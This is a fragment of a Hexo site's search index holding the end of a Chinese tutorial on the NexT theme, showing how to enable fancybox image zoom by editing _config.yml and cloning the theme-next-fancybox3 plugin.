id="33-图片可点击放大查看，放大后可关闭（fancybox可能有点问题，暂时未实现）">33. 图片可点击放大查看，放大后可关闭（fancybox可能有点问题，暂时未实现）</h2><p>打开<strong>主题配置文件</strong>_config.yml，搜索fancybox，设置其值为true：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fancybox: true</span><br></pre></td></tr></table></figure><p>进入到theme/next文件夹下，打开Git Bash，输入如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone theme-next/theme-next-fancybox3 source/lib/fancybox</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
